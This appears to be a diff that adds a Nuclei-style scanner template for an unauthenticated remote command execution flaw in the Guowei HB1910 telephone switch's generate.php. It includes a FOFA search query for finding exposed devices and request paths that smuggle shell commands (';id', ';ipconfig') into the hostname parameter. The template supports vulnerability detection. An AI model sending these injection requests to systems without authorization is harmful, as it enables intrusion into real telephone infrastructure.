@@ -1,0 +1,36 @@
+id: guowei-telephone-switch-generate-rce
+info:
+  name: 国威 HB1910 数字程控电话交换机 generate.php - RCE
+  author: leadlife
+  severity: critical
+  description: 国威HB1910数字程控电话交换机 generate.php 接口存在远程命令执行漏洞，未经身份验证的恶意攻击者可以利用该漏洞远程执行任意命令，写入webshell后门文件，获取服务器权限。
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E6%B7%B1%E5%9C%B3%E5%9B%BD%E5%A8%81%E7%94%B5%E5%AD%90/%E5%9B%BD%E5%A8%81HB1910%E6%95%B0%E5%AD%97%E7%A8%8B%E6%8E%A7%E7%94%B5%E8%AF%9D%E4%BA%A4%E6%8D%A2%E6%9C%BAgenerate.php%E6%9C%AA%E6%8E%88%E6%9D%83RCE%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: body="themes/tenant/css/login.css"
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: guowei,rce,2024,iot
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/modules/ping/generate.php?send=Ping&hostname=;ipconfig"
+      - "{{BaseURL}}/modules/ping/generate.php?send=Ping&hostname=;id"
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "Windows IP"
+          - "((u|g)id|groups)=[0-9]{1,4}\\([a-z0-9]+\\)"
+        condition: or
+
+      - type: status
+        status:
+          - 200
